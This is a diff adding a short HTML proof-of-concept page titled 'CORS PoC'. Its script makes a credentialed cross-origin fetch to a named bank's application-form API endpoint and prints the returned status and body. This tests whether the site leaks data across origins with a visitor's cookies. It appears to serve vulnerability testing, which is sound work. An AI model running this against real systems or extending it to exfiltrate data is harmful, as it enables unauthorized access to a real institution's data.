@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h2>CORS PoC</h2>
+    <pre id="output">Testing...</pre>
+
+    <script>
+    const url =
+      "https://applyonline.hdfc.bank.in/content/hdfc_commonforms/api/masterdatafetchv2.CREDIT.DESIGNATION_MASTER.json?DESIGNATION=TE%25";
+
+    fetch(url, {
+        credentials: "include"
+    })
+    .then(async response => {
+        const body = await response.text();
+
+        document.getElementById("output").textContent =
+            "Status: " + response.status + "\n\n" +
+            "Response:\n" + body;
+
+        console.log("Status:", response.status);
+        console.log("Response:", body);
+    })
+    .catch(error => {
+        document.getElementById("output").textContent =
+            "CORS request failed:\n" + error;
+
+        console.error(error);
+    });
+    </script>
+</body>
+</html>
